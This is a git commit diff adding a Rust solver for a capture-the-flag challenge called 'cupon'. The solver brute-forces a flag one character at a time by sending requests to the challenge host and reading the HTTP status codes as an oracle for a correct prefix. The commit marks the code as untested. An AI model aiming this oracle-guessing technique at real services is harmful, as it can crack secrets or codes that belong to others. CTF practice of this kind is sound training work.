1981903e86a3429ae9dbdaeb0ffc8780c3bb1ee7
Mikkel <Mikkel123sej@gmail.com>
2024-11-22 00:21:54 +0100

    completed(untested) "cupon" ctf-challenge

--- cupon/src/main.rs
+++ cupon/src/main.rs
@@ -1,3 +1,5 @@
+use itertools::{FoldWhile, Itertools};
+use reqwest::StatusCode;
 use std::fmt::{Display, Formatter};
 
 const MIN_INNER_SYMBOLS: &[char] = &['4', 'w', 'x', 'v', 'b', 'T', 'Y', 'H', 'J', 'K', 'N', '-'];
@@ -5,19 +7,50 @@ const EXTRA: &str = "HKN";
 
 struct Flag<'a>(&'a str);
 impl Display for Flag<'_> {
-	fn fmt(&self, f: &mut Formatter<'_>) -> std::fmt::Result {
-		write!(f, "{}{{{}}}", EXTRA, self.0)
-	}
+    fn fmt(&self, f: &mut Formatter<'_>) -> std::fmt::Result {
+        write!(f, "{}{{{}}}", EXTRA, self.0)
+    }
 }
 
-fn main() {
-	println!("Hello, world!");
-}
-
-/// POST target: `https://aubergine.hkn/cupon
+/// POST target: `https://aubergine.hkn/cupon`
 /// payload: `cupon=<data>`
 /// HTTP-status responses:
 /// - 303 (partial)
-/// - 301 (none)
+/// - 301 (incorrect)
 /// - 302 (complete)
-fn send() {}
+fn main() {
+    let req = reqwest::blocking::Client::new().post("https://aubergine.hkn/cupon");
+
+    let complete = MIN_INNER_SYMBOLS
+        .iter()
+        .cycle()
+        .fold_while(String::new(), |mut partial, &c| {
+            partial.push(c);
+            match loop {
+                if let Ok(response) = req
+                    .try_clone()
+                    .unwrap()
+                    .header("cupon", Flag(&partial).to_string())
+                    .send()
+                {
+                    break response;
+                }
+            }
+            .status()
+            {
+                // 301 (incorrect)
+                StatusCode::MOVED_PERMANENTLY => {
+                    let _ = partial.pop().unwrap(); // undo
+                    FoldWhile::Continue(partial)
+                }
+                // 302 (complete)
+                StatusCode::FOUND => FoldWhile::Done(partial),
+                // 303 (next partial)
+                StatusCode::SEE_OTHER => FoldWhile::Continue(partial),
+                _ => unimplemented!("Unexpected status code"),
+            }
+        })
+        .into_inner();
+
+    println!("Password: {}", Flag(&complete));
+}
